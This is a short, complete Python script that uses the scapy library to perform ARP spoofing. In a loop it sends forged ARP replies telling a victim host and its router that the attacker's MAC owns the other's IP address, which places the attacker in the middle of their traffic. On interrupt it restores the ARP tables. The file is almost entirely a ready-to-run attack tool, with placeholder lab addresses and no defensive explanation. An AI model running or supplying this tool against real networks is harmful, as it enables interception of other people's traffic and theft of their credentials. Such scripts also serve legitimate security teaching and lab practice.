#!/usr/bin/env python3


import scapy.all as scapy
import time


# Gloabal Variables
##############################################################################
TARGET_IP = "10.0.2.15"                           # Target Ip Address
TARGET_MAC_ADDR = "aa:bb:cc:dd:ee:ff"             # Target MAC Address
ROUTER_IP = "10.0.2.1"                            # Router Ip Address
ROUTER_MAC_ADDR = "11:22:33:44:55:66"             # Router MAC Address
MITM_MAC_ADDR = "a1:b2:c3:d4:e5:f6"               # MITM(You) MAC Address
OPERATION = 2                                     # Arp Response Package
SLEEP_TIME = 2                                    # Sleep Time
RESTORE_PKG_COUNT = 3                             # Restore Package Count
##############################################################################


def redirect_arp(dest_ip,dest_mac,source_ip,source_mac,send_pkg_count=1):
    package = scapy.ARP()                         # ARP Package Generated
    package.op = OPERATION                        # Set Operation to Response
    package.pdst = dest_ip                        # Set Dest Ip Address
    package.hwdst = dest_mac                      # Set Dest MAC Address
    package.psrc = source_ip                      # Set Source Ip Address 
    package.hwsrc = source_mac                    # Set Source MAC Address
    scapy.send(package,count=send_pkg_count,      # Send the Package
            verbose=False)


def main():
    # Send Packet to the Victim to Say I am the Router
    redirect_arp(TARGET_IP,TARGET_MAC_ADDR,ROUTER_IP,MITM_MAC_ADDR)

    # Send Packet to the Router to Say I am the Victim
    redirect_arp(ROUTER_IP,ROUTER_MAC_ADDR,TARGET_IP,MITM_MAC_ADDR)

    print("\r"+TARGET_IP+" <---> "+"[YOU]"+" <---> "+ROUTER_IP, end="")


if __name__ == '__main__':
    try:
        while True:
            main()
            time.sleep(SLEEP_TIME)
    except KeyboardInterrupt:
        print("\n[-] Arp Tables Restoring...")
        redirect_arp(TARGET_IP,TARGET_MAC_ADDR,ROUTER_IP,
                        ROUTER_MAC_ADDR,RESTORE_PKG_COUNT)
        redirect_arp(ROUTER_IP,ROUTER_MAC_ADDR,TARGET_IP,
                        TARGET_MAC_ADDR,RESTORE_PKG_COUNT)
        print("[+] Done!")
        print("[-] Quiting...")